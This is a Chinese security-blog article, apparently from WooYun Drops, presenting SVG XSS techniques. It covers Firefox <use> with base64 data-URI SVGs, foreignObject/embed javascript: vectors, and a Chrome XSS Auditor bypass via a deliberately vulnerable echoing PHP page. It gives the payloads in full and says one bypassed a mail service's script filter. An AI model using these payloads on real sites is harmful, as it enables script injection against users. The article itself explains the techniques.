@@ -1,0 +1,63 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">用SVG来找点乐子</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">mramydnei</a> <span class="bull">·</span> <time title="2014/02/12 14:10" ui-time="" datetime="2014/02/12 14:10" class="published ng-binding ng-isolate-scope">2014/02/12 14:10</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>英文原文链接：<a href="http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html">http://insert-script.blogspot.co.at/2014/02/svg-fun-time-firefox-svg-vector.html</a></p><h2>0x00 一个新的FF SVG Vector</h2><hr><p>如果你对SVG没有任何的概念，可能阅读起来会比较吃力。如果你觉得看不懂可以先百度一下SVG是什么，我们都用它在干一些什么。 首先介绍一下SVG里的<code>&lt;use&gt;</code>元素：</p><p>使用<code>&lt;use&gt;</code>结合#来可以引用外部SVG文件中的元素。举个例子来说就是这样：</p><p>test.html:</p><pre><code>#!html
+&lt;svg&gt; 
+&lt;use xlink:href='external.svg#rectangle' /&gt; 
+&lt;/svg&gt;
+</code></pre><p>external.svg:</p><pre><code>#!html
+&lt;svg id="rectangle" xmlns="http://www.w3.org/2000/svg" 
+xmlns:xlink="http://www.w3.org/1999/xlink" 
+width="100" height="100"&gt; 
+&lt;a xlink:href="javascript:alert(location)"&gt; 
+&lt;rect x="0" y="0" width="100" height="100" /&gt; 
+&lt;/a&gt; 
+&lt;/svg&gt;
+</code></pre><p>这里需要注意的是这个外部的svg文件需要和引用这个文件的网站同源。这意味着这种方法在XSS的利用上会十分的鸡肋，或者说没有存在的意义。但 是有什么方法可以让它变成一个有用的XSS向量呢？Firefox在这里就可以帮上忙。因为我们都知道我们可以使用data URI的方式在内部创建一个svg文件来调用它。利用代码会像这样</p><pre><code>#!html
+&lt;svg&gt; 
+&lt;use xlink:href="data:image/svg+xml;base64, PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+DQo8YSB4bGluazpocmVmPSJqYXZhc2NyaXB0OmFsZXJ0KGxvY2F0aW9uKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#rectangle" /&gt; 
+&lt;/svg&gt;
+</code></pre><p>我们再进一步看一下这个svg文件base64解码后的样子：</p><pre><code>#!html
+&lt;svg id="rectangle" 
+xmlns="http://www.w3.org/2000/svg" 
+xmlns:xlink="http://www.w3.org/1999/xlink" 
+width="100" height="100"&gt; 
+&lt;a xlink:href="javascript:alert(location)"&gt; 
+&lt;rect x="0" y="0" width="100" height="100" /&gt; 
+&lt;/a&gt; 
+&lt;/svg&gt;
+</code></pre><p>我们之前也强调过，我们需要做一个有意义的攻击向量。但是这个方法存在一个缺陷，就是需要用户点击我们的rect才会触发。但是很少会有用户去点 击一些莫名其妙的东西。所以我们需要做一个自动触发的vector.但是有一个问题，就是script标签出现在一个外部的svg当中时，并不会被解析。 为了证明这一事实，我会在接下来的POC当中插入一段script。但是值得庆幸的是,svg还支持<code>&lt;foreignObject&gt;</code>元素。通 过指定该对象所需的扩展属性，就可以实现对非SVG元素的载入了。这意味着我们现在可以使用iframe embed或一些其它的HTML元素。在这里我选择了embed+javascript URL scheme</p><p>现在我们会在内部创建的svg文件看起来会像是这样：</p><pre><code>#!html
+&lt;svg id="rectangle" 
+xmlns="http://www.w3.org/2000/svg" 
+xmlns:xlink="http://www.w3.org/1999/xlink" 
+width="100" height="100"&gt; 
+
+&lt;script&gt;alert(1)&lt;/script&gt; 
+
+&lt;foreignObject width="100" height="50" 
+requiredExtensions="http://www.w3.org/1999/xhtml"&gt; 
+
+&lt;embed xmlns="http://www.w3.org/1999/xhtml" 
+src="javascript:alert(location)" /&gt; 
+
+&lt;/foreignObject&gt; 
+&lt;/svg&gt;
+</code></pre><p>让我们再用use元素+data URI来在内部创建这个svg文件：</p><pre><code>#!html
+&lt;svg&gt; 
+&lt;use xlink:href="data:image/svg+xml;base64, PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydChsb2NhdGlvbikiIC8+DQogICAgPC9mb3JlaWduT2JqZWN0Pg0KPC9zdmc+#rectangle" /&gt; 
+&lt;/svg&gt;
+</code></pre><p>一个新的FF SVG Vector就这样诞生了。(我用这个方法绕过了某邮箱禁止执行js的限制) **</p><h2>0x01 绕过chrome XSS Auditor</h2><hr><p>我们还是想和前面一样来引入一个外部的SVG文件。但是我们需要一个同源的SVG文件。这意味着data URI在这里是不可行的（chrome下 data URL都是在独立域执行的，SO..）。但是这也难不倒我们，因为我们可以把一个XSS漏洞用两遍来解决这个问题。</p><p>测试页面chrome.php</p><pre><code>#!php
+&lt;?php 
+echo "&lt;body&gt;"; 
+echo $_GET['x']; 
+echo "&lt;/body&gt;"; 
+?&gt;
+</code></pre><p>POC:</p><pre><code>http://133.52.240.75/chrome.php? 
+x=&lt;svg&gt;&lt;use height=200 width=200 
+xlink:href='http://133.52.240.75/chrome.php 
+?x=&lt;svg id="rectangle" 
+xmlns="http://www.w3.org/2000/svg" 
+xmlns:xlink="http://www.w3.org/1999/xlink" 
+width="100" height="100"&gt; 
+&lt;a xlink:href="javascript:alert(location)"&gt; 
+&lt;rect class="blue" x="0" y="0" width="100" height="100"/&gt; 
+&lt;/a&gt;&lt;/svg&gt;#rectangle'/&gt;&lt;/svg&gt;
+</code></pre><p>当然，不要忘了URL编码！</p><pre><code>http://133.52.240.75/chrome.php? x=%3Csvg%3E%3Cuse%20height=200%20width=200%20 xlink:href=%27http://133.52.240.75/chrome.php? x=%3Csvg%20id%3D%22rectangle%22%20 xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20 xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%20 %20%20%20width%3D%22100%22%20height%3D%22100%22%3E %3Ca%20xlink%3Ahref%3D%22javascript%3Aalert%28location%29%22%3E %3Crect%20class%3D%22blue%22%20x%3D%220%22%20 y%3D%220%22%20width%3D%22100%22 %20height%3D%22100%22%20%2F%3E %3C%2Fa%3E %3C%2Fsvg%3E%23rectangle%27/%3E%3C/svg%3E
+</code></pre><p>have fun!</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/845" rel="bookmark" id="re1">Bypass xss过滤的测试方法</a></li><li><a href="http://drops.wooyun.org/papers/894" rel="bookmark" id="re2">XSS挑战第一期Writeup</a></li><li><a href="http://drops.wooyun.org/papers/948" rel="bookmark" id="re3">一些你可能不知道的Flash XSS技巧</a></li><li><a href="http://drops.wooyun.org/tips/3831" rel="bookmark" id="re4">web扫描爬虫优化</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">- -</span> <span class="reply-time">2015-04-01 21:25:39</span></div><p></p><p>&quot;&quot;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">- -</span> <span class="reply-time">2015-04-01 21:24:09</span></div><p></p><p>&lt;&gt;&lt;&gt;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-05-05 14:07:11</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-03-25 20:58:50</span></div><p></p><p>学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-02-12 15:46:41</span></div><p></p><p>能用来xss</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">clzzy</span> <span class="reply-time">2014-02-12 14:46:17</span></div><p></p><p>我是职业打酱油的</p><p></p></div></div></div></div></div></main>
